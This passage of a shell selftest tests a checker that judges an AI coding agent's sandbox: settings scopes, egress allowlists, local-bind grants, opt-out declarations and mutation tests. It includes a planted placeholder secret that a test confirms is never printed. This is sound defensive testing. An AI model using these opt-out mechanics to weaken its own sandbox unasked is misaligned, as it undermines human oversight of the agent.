      export PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_MANAGED PREFLIGHT_SANDBOX_OS PREFLIGHT_SANDBOX_TOOLS PREFLIGHT_SANDBOX_BWRAP_OK
      miss=0; rec=0
      check_sandbox 2>&1 ) || true
  }
  _s12_beg() { _s12_ok=1; _s12_why=""; }   # start a cell: the checks below accumulate, _s12_end prints ONE line
  _s12_has() {  # <substring>: $out must hold it
    case "$out" in
      *"$1"*) : ;;
      *) _s12_ok=0; _s12_why="$_s12_why [missing: $1]" ;;
    esac
  }
  _s12_not() {  # <substring>: $out must not hold it
    case "$out" in
      *"$1"*) _s12_ok=0; _s12_why="$_s12_why [printed: $1]" ;;
      *) : ;;
    esac
  }
  _s12_after() {  # <anchor> <substring>: the anchor is in $out and the substring comes after its first occurrence
    _s12_r=${out#*"$1"}
    if [ "$_s12_r" = "$out" ]; then _s12_ok=0; _s12_why="$_s12_why [missing anchor: $1]"; return 0; fi
    case "$_s12_r" in
      *"$2"*) : ;;
      *) _s12_ok=0; _s12_why="$_s12_why [missing after '$1': $2]" ;;
    esac
  }
  _s12_n() {  # <grep pattern> <count>: exactly <count> lines of $out match
    _s12_c=$(printf '%s\n' "$out" | grep -c -e "$1" || true)
    if [ "$_s12_c" != "$2" ]; then _s12_ok=0; _s12_why="$_s12_why [$_s12_c lines match '$1', wanted $2]"; fi
  }
  _s12_end() {  # <label> <what>
    if [ "${_s12_mode:-}" = quiet ]; then   # a mutant run: no line, the failing labels are collected for _s12_mut
      if [ "$_s12_ok" -eq 1 ]; then return 0; fi
      _s12_failed="$_s12_failed $1"; return 0
    fi
    if [ "$_s12_ok" -eq 1 ]; then printf '%s\n' "PASS: $1 $2"; else printf '%s\n' "FAIL: $1 $2 ($_s12_why)"; fail=1; fi
  }
  _s12_kit='From the kit (hosts kit flows use); review each before you add it:'; _s12_rr='results-receiver.actions.githubusercontent.com'; _s12_npm='registry.npmjs.org'
  _s12_cfgp='$CLAUDE_CONFIG_DIR/settings.json'
  # shellcheck disable=SC2088  # a literal label printed to a person, never a path the shell opens
  _s12_tilde='~/.claude/settings.json'
  _s12_ccd() {   # the CCD cells; a function so the mutants below can run the same cells against a mutated copy of the functions under test
  # CCD: the user scope. The project file enables the sandbox with read-deny and write-protect ON (full.json); the OS seam can start.
  _s12_reset; _s12_cfg="$_s12/cfgstrict"; _s12_bc
  _s12_beg; _s12_has 'ok   egress: ENFORCED'; _s12_end S1012-CCD-1 "[cfg-dir-is-the-user-scope] CLAUDE_CONFIG_DIR's settings.json (strict) is read, HOME's (not strict) is not: egress ENFORCED"
  _s12_reset; _s12_cfg="$_s12/cfgplain"; _s12_home="$_s12/homestrict"; _s12_bc
  _s12_beg; _s12_has 'egress: NOT ENFORCED'; _s12_not 'egress: ENFORCED'; _s12_end S1012-CCD-2 "[home-not-read-when-cfg-set] HOME's strict file is not read while CLAUDE_CONFIG_DIR is set: egress NOT ENFORCED"
  _s12_reset; _s12_home="$_s12/homestrict"; _s12_bc
  _s12_beg; _s12_has 'ok   egress: ENFORCED'; _s12_end S1012-CCD-3 "[unset-reads-home] CLAUDE_CONFIG_DIR unset: HOME's strict file is read, egress ENFORCED"
  _s12_reset; _s12_cfg=""; _s12_home="$_s12/homestrict"; _s12_bc
  _s12_beg; _s12_has 'ok   egress: ENFORCED'; _s12_end S1012-CCD-4 "[empty-reads-home] CLAUDE_CONFIG_DIR set but empty reads as unset: HOME's strict file is read, egress ENFORCED"
  _s12_reset; _s12_cfg="$_s12/cfgplain"; _s12_sum=1; _s12_bc
  _s12_beg; _s12_has 'egress: NOT ENFORCED'
  _s12_has "the user-level block to copy whole into $_s12_cfgp"; _s12_has "(1) merge the user-level block into $_s12_cfgp"; _s12_has "merge the block printed under the egress line above into $_s12_cfgp"
  _s12_f=$(printf '%s\n' "$out" | grep -v 'info boundary:' || true); _s12_o=$out; out=$_s12_f; _s12_not "$_s12_tilde"; out=$_s12_o
  _s12_end S1012-CCD-5 "[label-names-the-file-read] the block heading, the Fix and the summary name \$CLAUDE_CONFIG_DIR/settings.json by the variable's name, and none names ~/.claude/settings.json"
  _s12_reset; _s12_cfg=cfg; _s12_home="$_s12/homestrict"; _s12_bc
  _s12_beg; _s12_has 'warn egress: UNVERIFIED'; _s12_has 'warn egress: CLAUDE_CONFIG_DIR is not an absolute path, so the user scope was not read'; _s12_not 'egress: ENFORCED'; _s12_not 'egress: NOT ENFORCED'
  _s12_end S1012-CCD-6 "[relative-is-unverified] a relative CLAUDE_CONFIG_DIR reads egress UNVERIFIED with the not-absolute line, and HOME's strict file is not read in its place"
  _s12_reset; _s12_cfg="$_s12/ccd7-MARKERQ9Z"; _s12_sum=1; _s12_bc
  _s12_beg; _s12_has 'egress: NOT ENFORCED'; _s12_not 'MARKERQ9Z'
  _s12_end S1012-CCD-7 "[value-never-printed] the directory CLAUDE_CONFIG_DIR names (a marker in its name) never appears in the output, which is the variable's name only"
  _s12_reset; _s12_cfg="$_s12/cfgon"; _s12_proj="$_s12/noblock.json"; _s12_sb
  _s12_beg; _s12_has 'agent OS sandbox: on'
  _s12_end S1012-CCD-8 "[sandbox-line-reads-cfg] only CLAUDE_CONFIG_DIR's settings.json enables the sandbox: check_sandbox reads it as the user scope (agent OS sandbox: on)"
  _s12_reset; _s12_cfg="$_s12/cfgstrict"; _s12_rt=1; _s12_bc
  _s12_beg; _s12_has 'warn egress: UNVERIFIED'; _s12_not 'egress: ENFORCED'
  _s12_end S1012-CCD-9 "[in-session-stays-unverified] in a session (SANDBOX_RUNTIME) the variable does not reopen the user scope: egress UNVERIFIED, never ENFORCED"
  _s12_reset; _s12_cfg="$_s12/cfgstrict"; _s12_bc; _s12_beg; _s12_has 'info boundary:'
  _s12_reset; _s12_home="$_s12/homestrict"; _s12_bc; _s12_not 'info boundary:'
  _s12_end S1012-CCD-10 "[denywrite-belt-info] with CLAUDE_CONFIG_DIR used an info boundary line is printed (the shipped write-protect names the home file); with it unset none is"
  _s12_reset; _s12_cfg=cfg; _s12_home="$_s12/homeon"; _s12_proj="$_s12/noblock.json"; _s12_sb
  _s12_beg; _s12_not 'agent OS sandbox: on'; _s12_has 'user scope not read'
  _s12_end S1012-CCD-11 "[relative-skips-user-scope-in-check-sandbox] a relative CLAUDE_CONFIG_DIR: check_sandbox does not read HOME's enabling file (not on) and says the user scope was not read"
  _s12_reset; _s12_cfg=cfg; _s12_home="$_s12/homehosts"; _s12_mgd="$_s12/mgd-strict.json"; _s12_bc
  _s12_beg; _s12_has 'ok   egress: ENFORCED'; _s12_not 'info egress: the user-level allowedDomains holds'; _s12_not 'lacks'
  _s12_end S1012-CCD-12 "[relative-reads-no-home-hosts] ENFORCED by the managed scope with a relative CLAUDE_CONFIG_DIR: HOME's file (it holds hosts) is read for no host count and no kit-host line"
  _s12_reset; _s12_cfg="$_s12/cfgon"; _s12_proj="$_s12/noblock.json"; _s12_rt=1; _s12_sb
  _s12_beg; _s12_not 'agent OS sandbox: on'; _s12_has 'user scope not read in a session'
  _s12_end S1012-CCD-13 "[in-session-cfg-file-not-read] in a session a CLAUDE_CONFIG_DIR file is not read by check_sandbox (it may not be read-denied): not on, with the clause"
  }
  # EGR: the kit's host suggestions. The user seam is set here (an UNDECLARED NOT ENFORCED run, or an ENFORCED one), the cwd is a fixture directory; no settings file is ever written.
  _s12_egr() {
  _s12_snap() { { find "$_s12" -type f -name '*.json' -exec cksum {} + 2>/dev/null; cksum "$_bnd/full.json" "$_bnd/user-plain.json"; } | sort; }
  _s12_snap0=$(_s12_snap)
  _s12_reset; _s12_usr="$_bnd/user-plain.json"; _s12_bc
  _s12_beg; _s12_has 'FAIL egress: NOT ENFORCED and UNDECLARED'; _s12_after "$_s12_kit" "$_s12_rr"
  _s12_end S1012-EGR-1 "[kit-group-lists-results-receiver] the egress block's From the kit group lists results-receiver.actions.githubusercontent.com"
  _s12_reset; _s12_usr="$_bnd/user-plain.json"; _s12_cwd="$_s12/node"; _s12_bc
  _s12_beg; _s12_after "$_s12_kit" "$_s12_npm"; _s12_has 'supply-chain'
  _s12_end S1012-EGR-2 "[node-gets-npm] with a package.json at the root the group also lists registry.npmjs.org, flagged supply-chain"
  _s12_reset; _s12_usr="$_bnd/user-plain.json"; _s12_bc
  _s12_beg; _s12_has 'FAIL egress: NOT ENFORCED and UNDECLARED'; _s12_not "$_s12_npm"
  _s12_end S1012-EGR-3 "[no-npm-without-node] no package.json and no --stack: registry.npmjs.org is printed nowhere"
  _s12_reset; _s12_usr="$_bnd/user-plain.json"; _s12_stk=typescript-node; _s12_bc
  _s12_beg; _s12_after "$_s12_kit" "$_s12_npm"
  _s12_end S1012-EGR-4 "[stack-node-gets-npm] --stack typescript-node without a package.json: registry.npmjs.org is listed"
  _s12_reset; _s12_usr="$_s12/u-gh.json"; _s12_bc
  _s12_beg; _s12_has 'ok   egress: ENFORCED'; _s12_n "info egress:.*$_s12_rr" 1; _s12_not 'github.com'
  _s12_end S1012-EGR-5 "[enforced-names-missing-kit-host] ENFORCED, user list holds only github.com: one info egress line names results-receiver, and github.com is never printed"
  _s12_reset; _s12_usr="$_s12/u-rr.json"; _s12_bc
  _s12_beg; _s12_has 'ok   egress: ENFORCED'; _s12_not "$_s12_rr"
  _s12_end S1012-EGR-6 "[enforced-no-line-when-present] ENFORCED, user list already holds results-receiver: no kit-host line"
  _s12_reset; _s12_usr="$_s12/u-priv.json"; _s12_bc
  _s12_beg; _s12_has 'ok   egress: ENFORCED'; _s12_not 'private-host.example'
  _s12_end S1012-EGR-7 "[user-host-never-printed] ENFORCED, user list holds private-host.example: that host is never printed"
  _s12_reset; _s12_usr="$_bnd/user-plain.json"; _s12_cwd="$_s12/node"; _s12_bc; _s12_usr="$_s12/u-gh.json"; _s12_bc
  _s12_snap1=$(_s12_snap)
  _s12_beg
  if [ "$_s12_snap0" != "$_s12_snap1" ]; then _s12_ok=0; _s12_why="$_s12_why [a fixture settings file changed]"; fi
  if [ -z "$_s12_snap0" ]; then _s12_ok=0; _s12_why="$_s12_why [the snapshot is empty (vacuous)]"; fi
  _s12_end S1012-EGR-8 "[settings-never-written] every fixture settings file is byte-identical after the egress runs"
  _s12_reset; _s12_usr="$_bnd/user-plain.json"; _s12_rt=1; _s12_bc
  _s12_beg; _s12_has 'warn egress: UNVERIFIED'; _s12_after 'warn egress: UNVERIFIED' "$_s12_kit"; _s12_after "$_s12_kit" "$_s12_rr"
  _s12_end S1012-EGR-9 "[in-session-kit-group] in a session the UNVERIFIED line is followed by the kit group (names only)"
  }
  # GH: the gh line carries the fix. The project file enables the sandbox; the OS seam can start; the trust variables are cleared by the runner.
  _s12_gh() {
  _s12_reset; _s12_proj="$_s12/on.json"; _s12_usr=/nonexistent-user; _s12_sb
  _s12_beg; _s12_has 'info gh:'; _s12_has 'OSStatus -26276'; _s12_has 'SSL_CERT_FILE=/private/etc/ssl/cert.pem gh'; _s12_has 'first bytes'
  _s12_end S1012-GH-1 "[gh-line-carries-the-fix] on Darwin with no trust variable the gh line holds the error text, the SSL_CERT_FILE prefix form and the first-bytes rule"
  _s12_reset; _s12_proj="$_s12/on.json"; _s12_usr=/nonexistent-user; _s12_ssl=/fixture/cert.pem; _s12_sb
  _s12_beg; _s12_has 'agent OS sandbox can start here'; _s12_not 'info gh:'
  _s12_end S1012-GH-2 "[gh-line-silent-with-ssl-file] SSL_CERT_FILE set: no gh line"
  _s12_reset; _s12_proj="$_s12/on.json"; _s12_usr=/nonexistent-user; _s12_os=Linux; _s12_tools="bwrap socat"; _s12_sb
  _s12_beg; _s12_has 'agent OS sandbox can start here'; _s12_not 'info gh:'
  _s12_end S1012-GH-3 "[gh-line-silent-on-linux] the Linux seam: no gh line"
  }
  _s12_cells() { _s12_ccd; _s12_egr; _s12_gh; }   # in order; the mutants below run all three in quiet mode
  _s12_cells
  # The mutants: a sed mutation of a TEMP COPY, whose functions under test replace the originals in a subshell; the cells then run quietly and the labels that FAIL must be exactly the ones named.
  # It must apply and parse, and a mutant that fails no cell is a FAIL (never padded).
  _s12_mut() {  # <name> <sed expr> <the labels that must fail, each with a leading space, in cell order>
    _s12_mf=$(mktemp)
    sed "$2" "$_self" > "$_s12_mf"
    if cmp -s "$_self" "$_s12_mf"; then printf '%s\n' "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1; rm -f "$_s12_mf"; return 0; fi
    if ! sh -n "$_s12_mf" 2>/dev/null; then printf '%s\n' "FAIL: mutant $1 does not parse (a mutant that cannot run would read as killed)"; fail=1; rm -f "$_s12_mf"; return 0; fi
    _s12_got=$( for _s12_fn in user_settings_scope check_sandbox check_boundary boundary_egress_block boundary_kit_hosts boundary_kit_group boundary_kit_missing boundary_summary; do
        eval "$(sed -n "/^$_s12_fn() {/,/^}/p" "$_s12_mf")"
      done
      _s12_mode=quiet; _s12_failed=""; _s12_cells
      printf '%s' "$_s12_failed" ) || _s12_got="<aborted>"
    rm -f "$_s12_mf"
    if [ "$_s12_got" = "$3" ]; then printf '%s\n' "PASS: mutant $1 is killed (it reds exactly:$3)"; else printf '%s\n' "FAIL: mutant $1 reds '$_s12_got', wanted '$3'"; fail=1; fi
  }
  _s12_mut ccd-route-always-home '/# MUT-CCD-ROUTE$/s/_us_path="\$CLAUDE_CONFIG_DIR\/settings.json"/_us_path="${HOME:-}\/.claude\/settings.json"/' ' S1012-CCD-1 S1012-CCD-2 S1012-CCD-8'
  _s12_mut ccd-label-always-home '/# MUT-CCD-LABEL$/s/_us_label=.[$]CLAUDE_CONFIG_DIR\/settings.json./_us_label="~\/.claude\/settings.json"/' ' S1012-CCD-5'
  _s12_mut ccd-relative-treated-absolute '/# MUT-CCD-REL$/s/_us_rel=1/_us_path="$CLAUDE_CONFIG_DIR\/settings.json"; _us_cfg=1/' ' S1012-CCD-6 S1012-CCD-11'
  _s12_mut ccd-empty-counts-as-set '/# MUT-CCD-EMPTY$/s/\[ -n "\${CLAUDE_CONFIG_DIR:-}" \]/[ "${CLAUDE_CONFIG_DIR+x}" = x ]/' ' S1012-CCD-4'
  _s12_mut ccd-denywrite-info-off '/# MUT-CCD-INFO$/s/-eq 1 \]; then/-eq 9 ]; then/' ' S1012-CCD-10'
  _s12_mut ccd-relative-keeps-home-path '/# MUT-CCD-RELPATH$/s/_us_path=""/:/' ' S1012-CCD-12'
  _s12_mut ccd-session-skip-off '/# MUT-CCD-SESS$/s/_ssess=1; fi/_ssess=0; fi/' ' S1012-CCD-13'
  _s12_mut egr-kit-group-not-printed '/# MUT-EGR-KIT$/s/printf .*# MUT-EGR-KIT$/: # MUT-EGR-KIT/' ' S1012-EGR-1 S1012-EGR-2 S1012-EGR-4 S1012-EGR-9'
  _s12_mut egr-node-test-always-false '/# MUT-EGR-NODE$/s/if \[ -f package.json \] || \[ "\${STACK:-}" = typescript-node \]; then/if false; then/' ' S1012-EGR-2 S1012-EGR-4'
  _s12_mut egr-node-test-always-true '/# MUT-EGR-NODE$/s/if \[ -f package.json \] || \[ "\${STACK:-}" = typescript-node \]; then/if true; then/' ' S1012-EGR-3'
  _s12_mut egr-member-always-present '/# MUT-EGR-MEMBER$/s/\[ "\$_km_in" = false \]/false/' ' S1012-EGR-5'
  _s12_mut egr-member-always-absent '/# MUT-EGR-MEMBER$/s/\[ "\$_km_in" = false \]/true/' ' S1012-EGR-6'
  _s12_mut gh-fix-clause-dropped '/# MUT-GH-FIX$/s/ Fix: [^"]* Kit verbs/ Kit verbs/' ' S1012-GH-1'
  rm -rf "$_s12"

  # ---- the real body: does an UNDECLARED opt-out move the EXIT (and only it)? Differential: plain rc versus the same run under --boundary-advisory, so an ambient
  # failure (a missing tool) cannot fake or hide the effect. Globals _g_* describe the scenario; CI, GITHUB_ACTIONS and SANDBOX_RUNTIME are cleared first.
  # (_self, _sd, the _g_* scenario globals and the helpers _bnd_run, _bnd_moves, _bnd_kill are set up by st_bnd_setup, top of the selftest block)
  _bnd_exit() {  # <label> <yes|no>: asserts that bfail does (yes) or does not (no) move the exit; weak PASS where the environment fails for another reason
    _bnd_moves "$_self"
    if [ "$2" = yes ] && [ "$_mv" = yes ] && [ "$_mv_plain" -eq 1 ]; then echo "PASS: boundary exit [$1] an UNDECLARED opt-out moves the exit to 1 (advisory exits $_mv_adv)"
    elif [ "$2" = yes ] && [ "$_mv_adv" -ne 0 ] && [ "$_mv" = no ] && [ -n "$_st_ci" ]; then echo "FAIL: boundary exit [$1] is not observable here (exit $_mv_adv under --boundary-advisory) and CI is set, so a weak result is a failure"; fail=1
    elif [ "$2" = yes ] && [ "$_mv_adv" -ne 0 ] && [ "$_mv" = no ]; then echo "PASS: (weak) boundary exit [$1] this environment exits $_mv_adv under --boundary-advisory, so bfail's effect is not observable here"
    elif [ "$2" = no ] && [ "$_mv" = no ]; then echo "PASS: boundary exit [$1] the exit does not move (plain $_mv_plain, advisory $_mv_adv)"
    else echo "FAIL: boundary exit [$1] expected moves=$2, got moves=$_mv (plain $_mv_plain, advisory $_mv_adv)"; fail=1; fi
  }
  _g_proj="$_bnd/off.json"; _g_decl=@absent;                      _bnd_exit undeclared-off yes
  _bnd_run "$_self" "--boundary-advisory"
  case "$_br_out" in
    *"OFF and UNDECLARED"*) echo "PASS: boundary exit [advisory-keeps-the-line] --boundary-advisory still prints the FAIL line" ;;
    *) echo "FAIL: boundary exit [advisory-keeps-the-line] the advisory run lost the UNDECLARED line ($_br_out)"; fail=1 ;;
  esac
  _g_decl="$_bnd/d-all.conf";                                     _bnd_exit declared-off no
  _g_decl=@unreadable;                                            _bnd_exit declaration-unreadable-gates-when-a-part-is-off yes
  _g_decl="$_bnd/m-eq.conf";                                      _bnd_exit malformed-declaration yes
  _g_decl=@nonregular;                                            _bnd_exit nonregular-declaration yes
  _g_proj="$_bnd/shortwrite.json"; _g_user="$_bnd/user-strict.json"; _g_decl=@absent; _bnd_exit partial-undeclared yes
  _g_decl="$_bnd/d-wp.conf";                                      _bnd_exit partial-declared no
  _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-plain.json"; _g_decl=@absent; _bnd_exit egress-undeclared yes
  _g_decl="$_bnd/d-egress.conf";                                  _bnd_exit egress-declared no
  _g_user="$_bnd/user-strict.json"; _g_decl=@absent;              _bnd_exit all-on no
  _g_user="$_bnd/user-plain.json"; _g_env=SANDBOX_RUNTIME=1;      _bnd_exit egress-unverified-in-session no
  _g_proj="$_bnd/off.json"; _g_user=""; _g_env=CI=true;           _bnd_exit ci-declared-tier no
  _g_env=""; _g_proj="$_bnd/full.json"; _g_os=Plan9; _g_user="$_bnd/user-strict.json"; _g_decl=@absent; _bnd_exit cannot-start-undeclared yes
  _g_os=""
  # `--boundary-only` is the doctor leg: it prints only the boundary block and exits 0 / 1 / 2 (UNVERIFIED), and it judges STALE.
  _bo() {  # <label> <want rc> <substring or ""> <substring that must be absent or "">: the --boundary-only run in the current scenario
    _bnd_run "$_self" "--boundary-only"
    if [ "$_br_rc" -eq "$2" ]; then echo "PASS: boundary-only [$1] exits $2"; else echo "FAIL: boundary-only [$1] exited $_br_rc, expected $2 ($_br_out)"; fail=1; fi
    if [ -n "$3" ]; then
      case "$_br_out" in
        *"$3"*) echo "PASS: boundary-only [$1] prints '$3'" ;;
        *) echo "FAIL: boundary-only [$1] did not print '$3' ($_br_out)"; fail=1 ;;
      esac
    fi
    if [ -n "$4" ]; then
      case "$_br_out" in
        *"$4"*) echo "FAIL: boundary-only [$1] printed '$4' ($_br_out)"; fail=1 ;;
        *) echo "PASS: boundary-only [$1] does not print '$4'" ;;
      esac
    fi
  }
  _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-strict.json"; _g_env=""
  _g_decl=@absent;                  _bo all-on-no-declaration 0 'ok   boundary: ON [static]' 'STALE'
  _g_decl="$_bnd/d-egress.conf";    _bo stale-egress 0 'warn boundary: declaration for part=egress is STALE (the part is ON in this checkout)' 'Universal prerequisites'
  _g_decl="$_bnd/d-all.conf";       _bo stale-all 0 'declaration for part=all is STALE' ''
  _g_decl="$_bnd/d-rd.conf";        _bo stale-read-deny 0 'declaration for part=read-deny is STALE' ''
  _g_decl=@unreadable;              _bo on-unreadable-no-stale 0 'info boundary: declaration not read (no origin read under the selftest); STALE not judged' 'STALE (the part'
  _g_proj="$_bnd/off.json"; _g_user=""
  _g_decl=@unreadable;              _bo off-unreadable 1 'FAIL boundary: declaration UNVERIFIED (no origin read under the selftest) while a part is OFF' 'UNDECLARED'
  _g_decl=@absent;                  _bo off-undeclared 1 'OFF and UNDECLARED' ''
  _g_decl="$_bnd/d-all.conf";       _bo off-declared 0 'opted out 2026-10-23' 'STALE'
  _g_decl="$_bnd/m-eq.conf";        _bo off-malformed 1 'declaration MALFORMED' 'leakword'
  _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-plain.json"; _g_decl="$_bnd/d-egress.conf"; _bo egress-declared-still-not-stale 0 'WARN egress: NOT ENFORCED [static] (opted out' 'STALE'
  _g_env=SANDBOX_RUNTIME=1; _g_decl=@absent;                  _bo in-session-unverified 2 'warn egress: UNVERIFIED [static, agent-reported]' 'UNDECLARED'
  _g_env=CI=true; _g_proj="$_bnd/off.json";                   _bo ci-declared-off-is-unverified 2 'FAIL boundary: OFF [declared]' 'opted out'
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  if [ "$_br_rc" -eq 0 ]; then echo "PASS: boundary-only [advisory] --boundary-advisory keeps the exit at 0"; else echo "FAIL: boundary-only [advisory] exited $_br_rc"; fail=1; fi
  _g_env=""; _g_proj="$_bnd/off.json"; _g_user=""; _g_decl=@absent
  # (the mutant helper _bnd_kill is defined in st_bnd_setup, top of the selftest block)
  # ==== SWAS-945 (PR 3), D-241119-1: the local-bind GRANT. Cells LB-D1 (the grammar), LB-P1 to LB-P4 (the line, per state and scope) and the LB-M mutants. A grant is judged when it is ON, the reverse of a protection.
  printf '{"sandbox":{"network":{"allowLocalBinding":true}}}\n' > "$_bnd/lb-local.json"
  printf '{"env":{"KIT_TRACKER_TOKEN":"kit-PLANTEDSECRET-placeholder-token"},"sandbox":{"network":{"strictAllowlist":true,"allowLocalBinding":true}}}\n' > "$_bnd/user-lb.json"
  printf '%s\n' "part=local-bind reason=tests listen on a port lost=the agent can bind on 0.0.0.0 since=2026-11-18" > "$_bnd/d-lb.conf"
  printf '%s\n' "part=all reason=r lost=l since=2026-11-18" > "$_bnd/d-all2.conf"
  printf '%s\n' "part=read-deny reason=r lost=l since=2026-11-18" "part=write-protect reason=r lost=l since=2026-11-18" "part=egress reason=r lost=l since=2026-11-18" "part=local-bind reason=r lost=l since=2026-11-18" > "$_bnd/d-four.conf"
  printf '%s\n' "part=all reason=r lost=l since=2026-11-18" "part=local-bind reason=r lost=l since=2026-11-18" > "$_bnd/m-lball.conf"
  printf '%s\n' "part=local-binding reason=r lost=l since=2026-11-18" > "$_bnd/m-lbtypo.conf"
  { cat "$_bnd/d-four.conf"; printf '%s\n' "part=local-bind reason=r lost=l since=2026-11-18"; } > "$_bnd/m-lbfive.conf"
  # LB-D1: the grammar. Red on the old code: the first three (local-bind was an unknown part there).
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/m-lball.conf"
  bnd_has lb-d1-beside-all 'declaration MALFORMED (.kit/boundary-optout.conf: part=all appears with another part'
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/m-lbfive.conf"
  bnd_has lb-d1-cap-stays-four 'line 5: more than 4 records'
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/m-lbtypo.conf"
  bnd_has lb-d1-misspelt-part 'line 1: an unknown part name'
  _g_proj="$_bnd/full.json"; _g_user="$_bnd/user-strict.json"; _g_local=""; _g_env=""; _g_decl="$_bnd/d-four.conf"
  _bo lb-d1-four-records-parse 0 'declaration for part=local-bind is STALE' 'MALFORMED'
  # LB-P1: declared and ON (a local scope sets it): the loud WARN, exit 0, and no STALE on a grant that is ON.
  _g_local="$_bnd/lb-local.json"; _g_decl="$_bnd/d-lb.conf"
  _bo lb-p1-declared 0 'WARN local-bind: ON [static] (granted 2026-11-18, declared in .kit/boundary-optout.conf). Lost: the agent can bind on 0.0.0.0' 'UNDECLARED'
  _bo lb-p1-declared-not-stale 0 'ok   boundary: ON [static]' 'STALE'
  _bnd_exit lb-p1-declared-no-exit no
  # LB-P2: ON and undeclared is the one FAIL (exit 1); a part=all declaration does not cover a grant.
  _g_decl=@absent
  _bo lb-p2-undeclared 1 'FAIL local-bind: ON and UNDECLARED [static] — the agent'"'"'s processes can bind on 0.0.0.0' ''
  _bo lb-p2-fix-names-the-part 1 'Fix: the owner declares it in .kit/boundary-optout.conf (part=local-bind), or a person removes allowLocalBinding from .claude/settings.local.json' ''
  _bnd_exit lb-p2-undeclared-moves-the-exit yes
  _g_decl="$_bnd/d-all2.conf"
  _bo lb-p2-all-does-not-cover-a-grant 1 'local-bind: ON and UNDECLARED' ''
  _g_decl=@unreadable
  _bo lb-p2-unreadable-gates-while-on 1 'declaration UNVERIFIED (no origin read under the selftest) while a grant is ON. Remedy:' ''
  # LB-P3: declared while the effective value is not true (no scope sets it): the stale WARN, exit 0.
  _g_local=""; _g_decl="$_bnd/d-lb.conf"
  _bo lb-p3-stale 0 'warn boundary: declaration for part=local-bind is STALE (allowLocalBinding is not true in this checkout)' 'local-bind: ON'
  # LB-P4: a user-scope true. A terminal reads it (ON); the agent's shell cannot, so the line is UNVERIFIED and never ON.
  _g_user="$_bnd/user-lb.json"; _g_decl="$_bnd/d-lb.conf"
  _bo lb-p4-user-scope-terminal 0 'WARN local-bind: ON [static] (granted 2026-11-18' 'PLANTEDSECRET'
  _g_env=SANDBOX_RUNTIME=1; _g_decl=@absent
  _bo lb-p4-user-scope-agent-shell 2 'warn local-bind: UNVERIFIED (user scope not readable here) [static, agent-reported]' 'local-bind: ON'
  _g_env=""
  # LB-M: each mutant must lose the line its cell proves.
  _g_local="$_bnd/lb-local.json"; _g_user="$_bnd/user-strict.json"; _g_decl="$_bnd/d-all2.conf"
  _bnd_kill lb-exact-lookup-dropped '/MUT-LBEXACT/s/bd_lookup "\${_bc_t#=}" exact/bd_lookup "${_bc_t#=}"/' "--boundary-only --boundary-advisory" has 'local-bind: ON and UNDECLARED'
  _g_local=""; _g_decl="$_bnd/d-lb.conf"
  _bnd_kill lb-stale-silent '/MUT-LBSTALE/s/printf /: /' "--boundary-only --boundary-advisory" has 'declaration for part=local-bind is STALE'
  _g_local="$_bnd/lb-local.json"
  _bnd_kill lb-gate-dropped '/MUT-LBGATE/s/ || \[ "\$_blbs" = ON \]//' "--boundary-advisory" has 'WARN local-bind: ON'
  _g_local=""; _g_user="$_bnd/user-lb.json"; _g_env=SANDBOX_RUNTIME=1; _g_decl=@absent
  _bnd_kill lb-unverified-silent '/MUT-LBUNV/s/printf /: /' "--boundary-only --boundary-advisory" has 'local-bind: UNVERIFIED (user scope not readable here)'
  _g_env=""; _g_local=""; _g_proj="$_bnd/off.json"; _g_user=""; _g_decl=@absent
  # LB-I1: incept prints the local-bind step (the fragment, the declaration line and what it opens) for a stack whose scaffold tests listen on a port, and nothing for one whose tests do not.
  if [ -f "$_sd/incept.sh" ]; then
    _lbi=$(sh "$_sd/incept.sh" __emit-local-bind typescript-node 2>&1) || _lbi="<failed>"
    case "$_lbi" in
      *'{"sandbox":{"network":{"allowLocalBinding":true}}}'*"part=local-bind reason="*"0.0.0.0"*"fake GitHub on loopback"*) echo "PASS: lb-i1 [incept-step] a stack whose tests bind gets the fragment, the declaration line and what it opens" ;;
      *) echo "FAIL: lb-i1 [incept-step] the local-bind step is missing a part ($_lbi)"; fail=1 ;;
    esac
    _lbi=$(sh "$_sd/incept.sh" __emit-local-bind go 2>&1) || _lbi="<failed>"
    if [ -z "$_lbi" ]; then echo "PASS: lb-i1 [incept-step-none] a stack whose tests do not bind prints no local-bind step"; else echo "FAIL: lb-i1 [incept-step-none] printed ($_lbi)"; fail=1; fi
    _lbm=$(mktemp -d); sed '/MUT-LBSTEP/s/typescript-node)/none-such)/' "$_sd/incept.sh" > "$_lbm/incept.sh"
    if cmp -s "$_sd/incept.sh" "$_lbm/incept.sh"; then echo "FAIL: mutant lb-step-never-printed did not apply"; fail=1
    else
      _lbi=$(sh "$_lbm/incept.sh" __emit-local-bind typescript-node 2>&1) || _lbi=""
      if [ -z "$_lbi" ]; then echo "PASS: mutant lb-step-never-printed is killed"; else echo "FAIL: mutant lb-step-never-printed survived"; fail=1; fi
    fi
    rm -rf "$_lbm"
  else
    echo "PASS: (skip) lb-i1 cells: no scripts/incept.sh beside this script"
  fi
  _g_env=""; _g_proj="$_bnd/off.json"; _g_user=""; _g_decl=@absent
  # Owner ruling (amends D-241023-2 4(c)): the declared opt-out line is WARN, and the kit's consequence sentence is not repeated when the repo's lost= equals it.
  _g_proj="$_bnd/off.json"; _g_user=""; _g_decl="$_bnd/d-all.conf"; _g_env=""
  _bnd_kill declared-line-prefix-reverted-to-fail '/MUT-DECLWARN/s/"  WARN /"  FAIL /' "--boundary-only --boundary-advisory" has 'WARN boundary: OFF [static] (opted out'
  _g_decl=@absent
  # D-241026-2: an UNTRUSTED declaration fails from a terminal (--boundary-only exits 1), never under --boundary-advisory or CI (neither moves the exit), and prints its remedy.
  _ut() {  # <label> <reason substring> <remedy substring>: the current scenario must read UNTRUSTED with that reason and remedy
    _g_ci=""; _bnd_run "$_self" "--boundary-only"; _ut_rc=$_br_rc; _ut_out=$_br_out
    case "$_ut_out" in
